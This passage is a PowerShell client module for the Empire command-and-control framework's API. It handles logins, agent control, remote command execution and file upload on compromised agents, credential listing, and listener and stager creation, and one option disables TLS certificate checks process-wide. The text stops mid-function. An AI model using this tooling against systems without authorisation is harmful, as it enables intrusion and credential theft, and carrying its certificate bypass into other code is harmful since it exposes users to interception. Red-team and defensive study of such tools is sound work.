################################################
##############  EmpireStrikeX  ##############0.0
################################################

################################################
########################################### VARS
#region VARS

# Enum ListenerType   -> For Dynamic Param
# Enum ModuleCategory -> For Dynamic Param
# Glob EmpireSession  -> Empire Session Objs
# Glob EmpireTarget   -> Target Session + Agent
# Glob EmpireStrike   -> Target Module + Option
# Glob EmpireList     -> All Other Empire Obj



################################### ListenerType
enum ListenerType{
    dbx
    http
    http_com
    http_foreign
    http_hop
    http_mapi
    meterpreter
    redirector
    }



################################# ModuleCategory
enum ModuleCategory{
    code_execution
    collection
    credendials
    exfiltration
    exploitation
    lateral_movement
    management
    persistence
    privesc
    recon
    situational_awareness
    trollsploit
    exploit
    custom
    }



################################## EmpireSession
if(!$Global:EmpireSession){
    $Global:EmpireSession = New-Object System.Collections.ArrayList
    }



################################### EmpireTarget
if(!$Global:EmpireTarget){
    $Global:EmpireTarget = New-Object PSCustomObject -Prop @{
        ID            = '?'
        Agent         = '?'
        }}



################################### EmpireStrike
if(!$Global:EmpireStrike){
    $Global:EmpireStrike = New-Object PSCustomObject -Prop @{
        Module        = '?'
        Option        = '?'
        }}



##################################### EmpireList
if(!$Global:EmpireList){
    $Global:EmpireList  = New-Object PSCustomObject -Prop @{
        Module       = $Null
        ModuleName   = $Null
        AgentName    = $Null
        ListenerName = $Null
        StagerType   = $Null
        Temp         = $Null
        TempType     = $Null
        }}



######################################### Banner
$Banner = @('
                                         
                              `````````  
                         ``````.--::///+ 
                     ````-+sydmmmNNNNNNN 
                   ``./ymmNNNNNNNNNNNNNN 
                 ``-ymmNNNNNNNNNNNNNNNNN 
               ```ommmmNNNNNNNNNNNNNNNNN 
              ``.ydmNNNNNNNNNNNNNNNNNNNN 
             ```odmmNNNNNNNNNNNNNNNNNNNN 
            ```/hmmmNNNNNNNNNNNNNNNNMNNN 
           ````+hmmmNNNNNNNNNNNNNNNNNMMN 
          ````..ymmmNNNNNNNNNNNNNNNNNNNN 
          ````:.+so+//:---.......----::- 
         `````.`````````....----:///++++ 
        ``````.-/osy+////:::---...-dNNNN 
        ````:sdyyydy`         ```:mNNNNM 
       ````-hmmdhdmm:`      ``.+hNNNNNNM 
       ```.odNNmdmmNNo````.:+yNNNNNNNNNN 
       ```-sNNNmdh/dNNhhdNNNNNNNNNNNNNNN 
       ```-hNNNmNo::mNNNNNNNNNNNNNNNNNNN 
       ```-hNNmdNo--/dNNNNNNNNNNNNNNNNNN 
      ````:dNmmdmd-:+NNNNNNNNNNNNNNNNNNm 
      ```/hNNmmddmd+mNNNNNNNNNNNNNNds++o 
     ``/dNNNNNmmmmmmmNNNNNNNNNNNmdoosydd 
     `sNNNNdyydNNNNmmmmmmNNNNNmyoymNNNNN 
     :NNmmmdso++dNNNNmmNNNNNdhymNNNNNNNN 
     -NmdmmNNdsyohNNNNmmNNNNNNNNNNNNNNNN 
     `sdhmmNNNNdyhdNNNNNNNNNNNNNNNNNNNNN 
       /yhmNNmmNNNNNNNNNNNNNNNNNNNNNNmhh 
        `+yhmmNNNNNNNNNNNNNNNNNNNNNNmh+: 
          `./dmmmmNNNNNNNNNNNNNNNNmmd.   
            `ommmmmNNNNNNNmNmNNNNmmd:    
             :dmmmmNNNNNmh../oyhhhy:     
             `sdmmmmNNNmmh/++-.+oh.      
              `/dmmmmmmmmdo-:/ossd:      
                `/ohhdmmmmmmdddddmh/     
                   `-/osyhdddddhyo:      
                        ``.----.`        
                                         
 .-------------------------------------. 
 | EmpireStrikeX - 0.1 - @SadProcessor | 
 ''-------------------------------------'' 
')#


#endregion #####################################


################################################
###################################### INTERNALS
#region INTERNALS

# EmpireConnect  ->  Connect to Server
# EmpireCall     ->  Call Empire API
# DynDico        ->  Dyn Param Generator
# AutoSession    ->  Auto Session Update/Target
# AutoTarget     ->  Auto Target Agent + Warning
# UnpackOption   ->  Reformat Option Obj
# MFilter        ->  Module Name Filter
# Only           ->  Property Filter Pipe
# FixSession     ->  Re-Allocate Session IDs
# LastError      ->  Last Error to Warning
# DynSession     ->  Dyn Session Param List



################################## EmpireConnect

<#
.Synopsis
   New Empire Session
.DESCRIPTION
   # INTERNAL
   Connect to Empire Server
   Add Session Obj to $EmpireSession
.EXAMPLE
   EmpireConnect 10.1.2.3 Sadprocessor -NoSSL
   Connects to Empire
   Prompts for Password
#>
function EmpireConnect{
    [CmdletBinding()]
    Param(
        # Server IP
        [Parameter(Mandatory=1)][Alias('Host')][String]$Server,
        # UserName (Will Prompt for Password)
        [Parameter(Mandatory = $true)]
        [Management.Automation.CredentialAttribute()][Management.Automation.PSCredential]$User,
        # Switch Disable SSL
        [Parameter(Mandatory=0)][Switch]$NoSSL,
        # Optional Port
        [Parameter(Mandatory=0)][Int]$Port=1337
        )
    # If No SSL
    if($NoSSL){
        Try{
            # Dissable Cert Check ################################# <------------------------ /!\ Check /!\
            Add-Type @"
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;           
public class ServerCertificateValidationCallback{
    public static void Ignore(){
        ServicePointManager.ServerCertificateValidationCallback += 
            delegate(
                Object obj, 
                X509Certificate certificate, 
                X509Chain chain, 
                SslPolicyErrors errors
                ){return true;};}}
"@
            [ServerCertificateValidationCallback]::Ignore()
            ####################################################### <------------------------- /!\ Check /!\
            }Catch{<#nothing#>}}
    # Cred to Json
    $Pass = ConvertTo-Json @{
        username=$User.UserName
        password=$User.GetNetworkCredential().Password
        }
    # Prep Call Options
    $Call = @{
        Content = 'application/json'
        Method  = 'POST'
        Uri     = "https://$($Server):$($Port)/api/admin/login"
        Body    = "$Pass"
        }
    # Make Call
    $Reply = Invoke-RestMethod @Call
    # If Reply Token    
    if($Reply.token){
        # Create Session Obj
        $session = New-Object PSCustomObject -Property @{
            ID   = $Global:EmpireSession.token.Count
            Host = $Server
            Port = $Port
            Token= $Reply.token
            }
        # Add to Empire Sessions
        $Null = $Global:EmpireSession.Add($Session)
        # Return Session Obj
        Return $Session | Select ID,Host,Port,Token 
        }}
#####end



##################################### EmpireCall

<#
.Synopsis
   Call Empire API
.DESCRIPTION
   # INTERNAL
   Invoke-WebRequest to Empire API
   Requires Action Parameter
   Optional Spec And BodyHash
   Defaults to target Session ID
.EXAMPLE
   EmpireCall ModuleList
#>
function EmpireCall{
    Param(
        # Call Action
        [ValidateSet(<#'AdminLogin',#>'AdminToken','AdminRestart','AdminShutDown','AdminConfig','AdminVersion','AdminFile','AdminMap',
            'AgentList','AgentRemove','AgentView','AgentClearBuffer','AgentKill','AgentRename','AgentResult','AgentDeleteResult','AgentExec',
            'AgentUploadFile','AgentListStale','AgentRemoveStale','CredList','CredAdd','ListenerList','ListenerView','ListenerKill','ListenerNew',
            'ListenerOptions','ModuleList','ModuleView','ModuleExec',<#'ModuleSearch','ModuleSearchAuth','ModuleSearchComm','ModuleSearchDesc',
            'ModuleSearchName',#>'EventList','EventView','EventMessage','EventType','StagerList','StagerNew','StagerView')]
        [Parameter(Mandatory=1)][String]$Act,
        # Spec Param
        [Parameter(Mandatory=0)][String]$Spec,
        # Post Options
        [Parameter(Mandatory=0)][PSCustomObject]$Opt,
        # Session ID
        [Parameter(Mandatory=0)][Int]$ID=$Global:EmpireTarget.ID
        )
    # Prep Session Vars
    $Session = $Global:EmpireSession | where ID -eq $ID
    if(!$Session.token){Write-Warning "Session Not Found.";Break}
    $Server  = $Session.Host
    $Port    = $Session.Port
    $Token   = $Session.token
    # Action to Call Vars
    Switch($Act){
     <# ACTION           { METHOD    ; KEY                 ; ROUTE                               } TEST  #> 
      # Admin #############################################################################################
        AdminToken       {$M='GET'   ; $K=$Null            ; $R="/api/admin/permanenttoken"      } <# OK #>
        AdminRestart     {$M='GET'   ; $K=$Null            ; $R="/api/admin/restart"             } <# OK #>
        AdminShutDown    {$M='GET'   ; $K=$Null            ; $R="/api/admin/shutdown"            } <# OK #>
        AdminConfig      {$M='GET'   ; $K='config'         ; $R="/api/config"                    } <# OK #>
        AdminVersion     {$M='GET'   ; $K=$Null            ; $R="/api/version"                   } <# OK #>
        AdminFile        {$M='GET'   ; $K=$Null            ; $R="/static/$Spec"                  } <# ?? #>
        AdminMap         {$M='GET'   ; $K='Routes'         ; $R="/api/map"                       } <# OK #>
        <#AdminLogin     {$M='POST'  ; $K=$Null            ; $R="/api/admin/login"               }    XX #>
      # Agent #############################################################################################
        AgentList        {$M='GET'   ; $K='agents'         ; $R="/api/agents"                    } <# OK #>
        AgentRemove      {$M='DELETE'; $K=$Null            ; $R="/api/agents/$Spec"              } <# OK #>
        AgentView        {$M='GET'   ; $K='agents'         ; $R="/api/agents/$Spec"              } <# OK #>
        AgentClearBuffer {$M='GET'   ; $K=$Null            ; $R="/api/agents/$Spec/clear"        } <# OK #>
        AgentKill        {$M='GET'   ; $K=$Null            ; $R="/api/agents/$Spec/kill"         } <# OK #>
        AgentRename      {$M='POST'  ; $K=$Null            ; $R="/api/agents/$Spec/rename"       } <# ?? #>
        AgentResult      {$M='GET'   ; $K='results'        ; $R="/api/agents/$Spec/results"      } <# OK #>
        AgentDeleteResult{$M='DELETE'; $K=$Null            ; $R="/api/agents/$Spec/results"      } <# OK #>
        AgentExec        {$M='POST'  ; $K=$Null            ; $R="/api/agents/$Spec/shell"        } <# ?? #>
        AgentUploadFile  {$M='POST'  ; $K=$Null            ; $R="/api/agents/$Spec/upload"       } <# ?? #>
        AgentListStale   {$M='GET'   ; $K='agents'         ; $R="/api/agents/stale"              } <# OK #>
        AgentRemoveStale {$M='DELETE'; $K=$Null            ; $R="/api/agents/stale"              } <# OK #>
      # Cred ##############################################################################################
        CredList         {$M='GET'   ; $K='creds'          ; $R="/api/creds"                     } <# OK #>
        CredAdd          {$M='POST'  ; $K=$Null            ; $R="/api/creds"                     } <# ?? #>
      # Listener ##########################################################################################
        ListenerList     {$M='GET'   ; $K='listeners'      ; $R="/api/listeners"                 } <# OK #>
        ListenerView     {$M='GET'   ; $K='listeners'      ; $R="/api/listeners/$Spec"           } <# OK #>
        ListenerKill     {$M='DELETE'; $K=$Null            ; $R="/api/listeners/$Spec"           } <# OK #>
        ListenerNew      {$M='POST'  ; $K=$Null            ; $R="/api/listeners/$Spec"           } <# OK #>
        ListenerOptions  {$M='GET'   ; $K='listeneroptions'; $R="/api/listeners/options/$Spec"   } <# OK #>
      # Module ############################################################################################
        ModuleList       {$M='GET'   ; $K='modules'        ; $R="/api/modules"                   } <# OK #>
        ModuleView       {$M='GET'   ; $K='modules'        ; $R="/api/modules/$Spec"             } <# OK #>
        ModuleExec       {$M='POST'  ; $K=$Null            ; $R="/api/modules/$Spec"             } <# ?? #>
        <#ModuleSearch   {$M='POST'  ; $K=$Null            ; $R="/api/modules/search"            }    XX 
        ModuleSearchAuth {$M='POST'  ; $K=$Null            ; $R="/api/modules/search/author"     }    XX 
        ModuleSearchComm {$M='POST'  ; $K=$Null            ; $R="/api/modules/search/comments"   }    XX 
        ModuleSearchDesc {$M='POST'  ; $K=$Null            ; $R="/api/modules/search/description"}    XX 
        ModuleSearchName {$M='POST'  ; $K=$Null            ; $R="/api/modules/search/modulename" }    XX #>
      # Event #############################################################################################
        EventList        {$M='GET'   ; $K='reporting'      ; $R="/api/reporting"                 } <# OK #>
        EventView        {$M='GET'   ; $K='reporting'      ; $R="/api/reporting/agent/$Spec"     } <# OK #>
        EventMessage     {$M='GET'   ; $K='reporting'      ; $R="/api/reporting/msg/$Spec"       } <# OK #>
        EventType        {$M='GET'   ; $K='reporting'      ; $R="/api/reporting/type/$Spec"      } <# OK #>
      # Stager ############################################################################################
        StagerList       {$M='GET'   ; $K='stagers'        ; $R="/api/stagers"                   } <# OK #>
        StagerNew        {$M='POST'  ; $K=$Null            ; $R="/api/stagers"                   } <# ?? #>
        StagerView       {$M='GET'   ; $K='stagers'        ; $R="/api/stagers/$Spec"             } <# OK #>
        }
    # Prep Call Options
    $Uri = "https://$($Server):$($Port)${R}?token=$Token"
    $Call = @{Content='application/json'; Method=$M; Uri=$Uri}
    Write-Verbose "EmpireCall - $Act $Spec [SessID $ID]"    
    # if POST add Body (Json)
    if($M -eq 'POST' -AND $Opt){
        $Json = ConvertTo-Json $Opt
        $Call.Add('Body',$Json)
        Write-Verbose "BODY`n`t$($Json.trim().trimEnd('}').trimStart('{').trim())"
        }
    # Make Call
    $Reply = Try{Invoke-RestMethod @Call}Catch{LastError}
    # Unpack & Return Reply 
    if($K -ne $Null){$Reply = $Reply.$K}
    Return $Reply
    }
#end



######################################## DynDico

<#
.Synopsis
   DynParam Dictionnary
.DESCRIPTION
   # INTERNAL
   Return Single DynParam Dictionnary
   Used for Dynamic Param Validation
.EXAMPLE
    DynParam: Switch on ParamSet
    DynamicParam{
        # Filter ParamSet
        if($PSCmdlet.ParameterSetName -in 'SetA','SetB'){
            # Populate Vars
            Switch($PSCmdlet.ParameterSetName){
                #SET { NAME     ; TYPE       ; MAND ; PIPE ; POS  ; VSET
                ###############################################################...
                SetA { $N='Name'; $T='String'; $M=1 ; $L=0 ; $P=0 ; $V=@('A1','A2')}
                SetB { $N='Num' ; $T='Int'   ; $M=0 ; $L=0 ; $P=0 ; $V=@(1,2,3)}
                }
            # Return Dico
            return DynDico -Name $N -Type $T -Mandat $M -Pipe $L -Pos $P -VSet $V    
            }}
#>
function DynDico{
    Param(
        [Parameter(Mandatory=1)][String]$Name,
        [Parameter(Mandatory=1)][String]$Type,
        [Parameter(Mandatory=0)][bool]$Mandat=0,
        [Parameter(Mandatory=0)][bool]$Pipe=0,
        [Parameter(Mandatory=0)][int]$Pos=$Null,
        [Parameter(Mandatory=0)][Array]$VSet=$Null
        )
    # Prep Empty Dico
    $Dico = New-Object Management.Automation.RuntimeDefinedParameterDictionary
    # Create Attribute Obj
    $Attrb = New-Object Management.Automation.ParameterAttribute
    $Attrb.Mandatory=$Mandat
    $Attrb.ValueFromPipeline=$Pipe
    $Attrb.ValueFromPipelineByPropertyName=$Pipe
    if($Pos -ne $null){$Attrb.Position=$Pos}
    # Create AttributeCollection
    $Cllct = New-Object Collections.ObjectModel.Collection[System.Attribute]
    # Add Attribute Obj to Collection
    $Cllct.Add($Attrb)
    if($VSet -ne $Null){
        # Create ValidateSet & add to collection     
        $VldSt=New-Object Management.Automation.ValidateSetAttribute($VSet)
        $Cllct.Add($VldSt)
        }
    # Create Runtine DynParam
    $Script:DynP = New-Object Management.Automation.RuntimeDefinedParameter($Name,$($Type-as[type]),$Cllct)
    # Add dynParam to Dictionary
    $Dico.Add($Name,$Script:DynP)      
    ## Return Dictionary
    return $Dico
    }
#end



#################################### AutoSession

<#
.Synopsis
   Auto Session
.DESCRIPTION
   # INTERNAL
   Auto Session ID
   Used when Connecting/Switching Session
   - Set Target Session ID
   - Sync Session Objects
   - Auto Target Agent / Warning 
.EXAMPLE
   AutoSession 0
#>
function AutoSession{
    Param([Parameter()][Int]$ID=$Global:EmpireTarget.ID)
    # Set Target Session
    $Global:EmpireTarget.ID = $ID
    # Update Session Vars
    Empire-Sync -Session
    # AutoTarget Agent
    AutoTarget
    }
#end



##################################### AutoTarget

<#
.Synopsis
   Auto Target Agent
.DESCRIPTION
   # INTERNAL
   Auto target Agent
   Used when Connecting/Switching Session
.EXAMPLE
   AutoTarget
#>
function AutoTarget{
    # If target not in Session
    if($Global:EmpireTarget.Agent -notin $Global:EmpireList.AgentName -OR $Global:EmpireTarget.Agent -eq $null){
        $Global:EmpireTarget.Agent = ''
        $L = [Array]$Global:EmpireList.AgentName
        Switch($L.count){
            0 {Write-Warning 'No Agents in Session'}
            1 {$Global:EmpireTarget.Agent = $L[0];Write-Warning "Auto Target - $($L[0])"}
            Default {Write-Warning 'Select Target Agent'}
            }}}
#########end



################################### UnpackOption

<#
.Synopsis
   Unpack Options
.DESCRIPTION
   # INTERNAL
   Make Nice Object
.EXAMPLE
   $Object | Only Options | Unpack
#>
function UnpackOptions{
    [Alias('Unpack')]
    Param(
        # Input Option Object
        [Parameter(Mandatory=1,ValueFromPipeline=1)]$In
        )
    Begin{$Out= @()}
    Process{
        if($In.Options){
            # For Each Object Property
            ($In.Options|gm|? MemberType -eq NoteProperty).name|%{
                # Add expanded object to Output
                $Out += New-Object PSCustomObject -Property @{
                    Name        = $_
                    Description = $In.Options.$_.Description
                    Required    = $In.Options.$_.Required
                    Value       = $In.Options.$_.Value
                    }}}
        # If .options Obj
        else{
            # For Each Object Property
            ($In|gm|? MemberType -eq NoteProperty).name|%{
                # Add expanded object to Output
                $Out += New-Object PSCustomObject -Property @{
                    Name        = $_
                    Description = $In.$_.Description
                    Required    = $In.$_.Required
                    Value       = $In.$_.Value
                    }}}}
    End{Return $Out|Select Name,Required,Value,Description}
    }
#end



#################################### WarnMissing

<#
.Synopsis
   Warn Missing Option
.DESCRIPTION
   # INTERNAL
   Missing Option Warning
   Used for Strike/Execute/Generate
.EXAMPLE
   WarnMissing $obj
.EXAMPLE
   if(WarnMissing $Global:EmpireList.temp){Return}
#>
function WarnMissing{
    [OutputType([bool])]
    Param([Parameter(Mandatory=1,ValueFromPipeline=1)][PSCustomObject]$Obj)
    Begin{$result=@()}
    Process{
        $Missing = [Array]($Obj | ? {($_.required -eq 'True' -AND ([String]$_.Value -eq ''))}).Name
        if($Missing.Count){
            Write-Warning "Required Option $($Missing-join',')"
            $result+=$true
            }}
    # Return $true/$Null
    End{if($Result.Count){Return $true}}
    }
#End



######################################## MFilter

<#
.Synopsis
   Filter Module List
.DESCRIPTION
   # INTERNAL
   Filter Module List
   Used for Dynamic Module Name
.EXAMPLE
   MFilter -Lang PowerShell
#>
function MFilter{
    Param(
        [ValidateSet('PowerShell','Python')]
        [Parameter()][String]$Lang,
        [Parameter()][String]$Cat
        )
    # Lang Only
    if($Lang -AND !$Cat){
        $Lang=$Lang.ToLower()
        $List = ($Global:EmpireList.ModuleName -match "$Lang/").replace("$Lang/",'')
        }
    # Cat Only
    elseif($Cat -AND !$Lang){
        $Cat=$Cat.ToLower()
        $List = $Global:EmpireList.ModuleName -match "$Cat/"
        $List = $List -replace "(.*)$Cat/",''
        }
    # Lang & Cat
    elseif($Lang -AND $Cat){
        $Lang=$Lang.ToLower()
        $List = ($Global:EmpireList.ModuleName -match "$Lang/").replace("$Lang/",'')
        $Cat=$cat.ToLower()
        $List = ($List -match "$Cat/").replace("$Cat/",'')
        }
    # No Filter
    elseif(!$Lang -AND !$Cat){$List = $Global:EmpireList.ModuleName}
    # Return List
    return $List
    }
#end



########################################### Only

<#
.Synopsis
   Pipe Prop Only
.DESCRIPTION
   # INTERNAL
   List Prop Value over Pipe
   Defaults to Name Property
.EXAMPLE
   $ObjectCollection | Only
#>
function Only{
    [Alias('Name')]
    Param(
        # Prop Name
        [Parameter()][String]$Prop='Name',
        # Input Obj
        [Parameter(ValuefromPipeline=$true)]$Obj       
        )
    ## Prep Empty Collector
    Begin{$List=@()}
    ## Filter Prop
    Process{if($Obj.$Prop){$List += $Obj.$Prop}}
    ## Return List
    End{Return $List}
    }
#end



##################################### DynSession

<#
.Synopsis
   Dyn Session ID
.DESCRIPTION
   # INTERNAL
   Return Dyn Session List
   for ValidateSet 
.EXAMPLE
   FixSession
#>
function DynSession{
    Switch($Global:EmpireSession.token.count){
        1{[Array]"$($Global:EmpireSession.id)"}
        Default{[Array]$Global:EmpireSession.id}
        }}
#####end



##################################### FixSession

<#
.Synopsis
   Fix Session IDs
.DESCRIPTION
   # INTERNAL
   Re-Allocate Session IDs
   Used after Session -Remove 
.EXAMPLE
   FixSession
#>
function FixSession{
    Write-Warning "New Session IDs"
    1..($Global:EmpireSession.token.Count) | %{
        $Global:EmpireSession[$_-1].ID = $_-1
        }}
#####end



###################################### LastError

<#
.Synopsis
   Last Error Warning
.DESCRIPTION
   # INTERNAL
   Last Error Message to Warning
   Used in Try/Catch for EmpireCall
.EXAMPLE
   LastError
#>
function LastError{
    [Cmdletbinding()]
    Param()
    ## Make It So
    if($Error[0].Exception){Write-Warning $Error[0].Exception.message.replace('. ',".`n`t`t ")}
    elseif($Error[0].ErrorDetails){Write-Warning $Error[0].ErrorDetails}
    else{Write-Warning $Error[0].PSMessageDetails.split("`n")[0]}
    }
#end


#endregion #####################################


################################################
###################################### EXTERNALS
#region EXTERNALS

# Empire-Admin     ->  Empire Admin Stuff
# Empire-Agent     ->  Interact with Empire Agents
# Empire-Cred      ->  Interact with Empire Cred DB
# Empire-Event     ->  View Empire Events
# Empire-Exec      ->  Execute Commands on agent
# Empire-Listener  ->  Interact with Empire Listeners
# Empire-Memo      ->  View EmpireStrike Cheat Sheet
# Empire-Module    ->  Interact with Empire Modules
# Empire-Option    ->  Set Module Options
# Empire-Result    ->  Get Agent result
# Empire-Search    ->  Quick Module Search
# Empire-Session   ->  Interact with Empire Sessions
# Empire-Sniper    ->  Shoot from Scriptpane (ISE/VSCode)    
# Empire-Speak     ->  Add Voice to Automations
# Empire-Stager    ->  Interact with Empire Stagers
# Empire-Strike    ->  Execute Empire Modules
# Empire-Sync      ->  Sync Empire Objects
# Empire-Target    ->  View/Set Target
# Empire-Tune      ->  Play Imperial March    
# Empire-Use       ->  Use Stager|Listener|Module
# Empire-View      ->  View Empire Objects




################################### Empire-Admin

<#
.Synopsis
   Empire Admin Actions
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Admin
   Example Description
.EXAMPLE
   Empire-Admin
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Admin{
    [CmdletBinding(DefaultParameterSetname='AdminConfig',HelpUri='https://github.com/EmpireProject/Empire/wiki',
                   SupportsShouldProcess=1,ConfirmImpact='High')]
    [Alias('Admin','Server')]
    Param(
		# Connect to Server
		[Parameter(Mandatory=1,ParameterSetName='AdminLogin')][Alias('X')][switch]$Login,
		# Get Permanent Token
		[Parameter(Mandatory=1,ParameterSetName='AdminToken')][switch]$Token,
		# Restart Empire
		[Parameter(Mandatory=1,ParameterSetName='AdminRestart')][switch]$Restart,
		# ShutDown Empire
		[Parameter(Mandatory=1,ParameterSetName='AdminShutDown')][switch]$ShutDown,
		# Empire Config
		[Parameter(Mandatory=0,ParameterSetName='AdminConfig')][switch]$Config,
		# Empire Version
		[Parameter(Mandatory=1,ParameterSetName='AdminVersion')][switch]$Version,
		# Empire File
		[Parameter(Mandatory=1,ParameterSetName='AdminFile')][switch]$File,
		# Map Empire API
		[Parameter(Mandatory=1,ParameterSetName='AdminMap')][Alias('API')][switch]$Map,
		# Server IP
		[Parameter(Mandatory=1,ParameterSetName='AdminLogin',Position=0)][Alias('Host','Srv')][string]$Server,
		# UserName
		[Parameter(Mandatory=1,ParameterSetName='AdminLogin',Position=1)][Alias('Name','Usr')][string]$User,
		# Port Number
		[Parameter(Mandatory=0,ParameterSetName='AdminLogin',Position=2)][int]$Port,
		# No SSL Check
		[Parameter(Mandatory=0,ParameterSetName='AdminLogin')][switch]$NoSSL
		)
    DynamicParam{
        # Filter ParamSet
        if($PSCmdlet.ParameterSetName -ne 'AdminLogin'){
            # Return Dico
            return DynDico -Name ID -Type int -Mandat 0 -Pipe 1 -Pos 0 -VSet (DynSession)
            }}
    ## Make It So
    Begin{$Result = @()}
    Process{
        # Session
        if($Script:DynP.IsSet){$Sess = $Script:DynP.Value}
        else{$Sess = $Global:EmpireTarget.ID}
        # Switch Action
        Switch($PsCmdlet.ParameterSetName){
            ## Login
            AdminLogin{
                $Null=$PSBoundParameters.Remove('Login')
                $Result = EmpireConnect @PSBoundParameters
                if($Result.token){AutoSession -ID ($Global:EmpireSession.count -1)}
                }
            ## Token
            AdminToken  {$Result = EmpireCall AdminToken   -ID $Sess}
            ## Config
            AdminConfig {$Result = EmpireCall AdminConfig  -ID $Sess}
            ## Version
            AdminVersion{$Result = EmpireCall AdminVersion -ID $Sess}
            ## File <-------------------------------------------------------------------------------------- /!\ ?? Broken ??
            AdminFile{<# ? #>}
            ## Restart
            AdminRestart{
                # Confirm [Use -Confirm:$false to skip]
                if($PSCmdlet.ShouldProcess("Session $Sess","Restart")){
                    $result = EmpireCall AdminRestart  -ID $Sess
                    }}
            ## ShutDown
            AdminShutDown{
                # Confirm [Use -Confirm:$false to skip]
                if($PSCmdlet.ShouldProcess("Session $Sess","Shutdown")){
                    $Result = EmpireCall AdminShutDown -ID $Sess
                    }}
            ## Map (API)
            AdminMap{
                # Fix Reply
                $All = EmpireCall AdminMap -ID $Sess -ErrorAction Stop
                foreach($Route in $All.split("`n").trim()-ne''){
                    # Extract
                    $Act = ($Route | sls "\[ \{ '(.*)': \[ \{ 'methods':").Matches.Groups[1].Value
                    $Met = ($Route | sls "'methods': '(.*)', 'url':"     ).Matches.Groups[1].Value
                    $Rte = ($Route | sls "'url': '(.*)' } ] } ]"         ).Matches.Groups[1].Value
                    # Add to Result
                    $Result += New-Object PSCustomObject -Property @{
                        Action = $Act
                        Method = $Met
                        Route  = $Rte
                        }}
                # Format
                $Result= $Result | Select Action,Method,Route | Sort Route
                }}}
    ## Return Result
    End{$Script:DynP = $Null; Return $Result}
    }
#end



################################### Empire-Agent

<#
.Synopsis
   Interact with Agents
.DESCRIPTION
   Long Description
.EXAMPLE
   Empire-Agent
   Example Description
.EXAMPLE
   Empire-Agent
   Example Description
.INPUTS
   Inputs
.OUTPUTS
   Outputs
.NOTES
   Notes
.FUNCTIONALITY
   Functionality
.LINK
   https://github.com/EmpireProject
#>
Function Empire-Agent{
    [CmdletBinding(DefaultParameterSetname='AgentView',HelpUri='https://github.com/EmpireProject/Empire/wiki')]
    [Alias('Agent','Agt')]
    Param(
		# List all Agents
		[Parameter(Mandatory=1,ParameterSetName='AgentList')][switch]$List,
		# Remove Agent
		[Parameter(Mandatory=1,ParameterSetName='AgentRemove')][switch]$Remove,
		# View Agent
		[Parameter(Mandatory=0,ParameterSetName='AgentView')][switch]$View,
		# Clear Agent buffer
		[Parameter(Mandatory=1,ParameterSetName='AgentClearBuffer')][switch]$ClearBuffer,
		# Kill Agent
		[Parameter(Mandatory=1,ParameterSetName='AgentKill')][switch]$Kill,
		# Rename Agent
		[Parameter(Mandatory=1,ParameterSetName='AgentRename')][switch]$Rename,
		# Agent Result
		[Parameter(Mandatory=1,ParameterSetName='AgentResult')][switch]$Result,
		# Delete Agent Result
		[Parameter(Mandatory=1,ParameterSetName='AgentDeleteResult')][Alias('ResultDelete')][switch]$DeleteResult,
		# Execute Command
		[Parameter(Mandatory=0,ParameterSetName='AgentExec')][Alias('PoSh','X')][switch]$Exec,
		# Upload File
		[Parameter(Mandatory=1,ParameterSetName='AgentUploadFile')][switch]$Upload,
		# List Stale Agents
		[Parameter(Mandatory=1,ParameterSetName='AgentListStale')][Alias('Stale')][switch]$ListStale,
		# Remove Stale Agents
		[Parameter(Mandatory=1,ParameterSetName='AgentRemoveStale')][Alias('StaleRemove')][switch]$RemoveStale,
		# Sync Agent List
		[Parameter(Mandatory=1,ParameterSetName='AgentSync')][switch]$Sync,
		# Set Target Agent
		[Parameter(Mandatory=1,ParameterSetName='AgentTarget')][Alias('Tgt','Select')][switch]$Target,
		# New Agent Name
		[Parameter(Mandatory=1,ParameterSetName='AgentRename')][string]$NewName,
		# Command to run
		[Parameter(Mandatory=1,ParameterSetName='AgentExec')][Alias('Cmd')][string]$Command,
		# File Path
		[Parameter(Mandatory=1,ParameterSetName='AgentUploadFile')][string]$File
		)
    DynamicParam{
        # Filter ParamSet
        if($PSCmdlet.ParameterSetName -notin 'AgentList','AgentSync','AgentListStale','AgentRemoveStale'){
            # Populate Vars
            Switch($PSCmdlet.ParameterSetName){
                #SET        { NAME     ; TYPE       ; MAND ; PIPE ; POS  ; VSET
                #########################################################################...
                AgentView   { $N='Name'; $T='String'; $M=0 ; $L=1 ; $P=0 ; $V=[Array]$Global:EmpireList.AgentName}
                AgentRename { $N='Name'; $T='String'; $M=1 ; $L=0 ; $P=0 ; $V=[Array]$Global:EmpireList.AgentName}
                Default     { $N='Name'; $T='String'; $M=1 ; $L=1 ; $P=0 ; $V=[Array]$Global:EmpireList.AgentName}
                }
            # Return Dico
            return DynDico -Name $N -Type $T -Mandat $M -Pipe $L -Pos $P -VSet $V
            }
        if($PSCmdlet.ParameterSetName -in 'AgentList','AgentListStale','AgentRemoveStale'){
            # Return Dico
            return DynDico -Name ID -Type String -Mandat 0 -Pipe 1 -Pos 0 -VSet (DynSession)
            }}
    ## Make It So
    Begin{$Reply=@()}
    Process{
        # Agent Name
        if($PSCmdlet.ParameterSetName -notin 'AgentList','AgentSync','AgentListStale','AgentRemoveStale'){
            if($Script:dynP.IsSet){$Agt=$Script:dynP.Value}
            else{if($PSCmdlet.ParameterSetName -notin 'AgentRemove','AgentKill'){$Agt=$Global:EmpireTarget.Agent}}
            if($Agt -eq $null){Write-Warning 'No Target Agent';Break}}
        # Session ID
        if($PSCmdlet.ParameterSetName -in 'AgentList','AgentListStale','AgentRemoveStale'){
            if($Script:DynP.IsSet){$Sess = $Script:DynP.Value}
            else{$Sess = $Global:EmpireTarget.ID}
            }
        # Switch Action
        Switch($PSCmdlet.ParameterSetName){
            # Sync
            AgentSync{Empire-Sync -Agent}
            # List Stale
            AgentListStale{$Reply += EmpireCall AgentListStale -ID $Sess}
            # Remove Stale
            AgentRemoveStale{$Reply += EmpireCall AgentRemoveStale -ID $Sess}
            # List
            AgentList{$Reply += (EmpireCall AgentList -ID $Sess) |Select * -ExcludeProperty 'results'}
            # Exec
            AgentExec{$Reply += Empire-Exec -Command $Command -Name $Agt}
            # Upload File
            AgentUploadFile{$Reply += EmpireCall AgentUploadFile -Spec $Agt -Opt @{path=$Command}}
            # Rename
            AgentRename{$Reply += EmpireCall AgentRename -Spec $Agt -Opt (New-Object PSCustomObject -Prop @{newname=$NewName})}
            # View
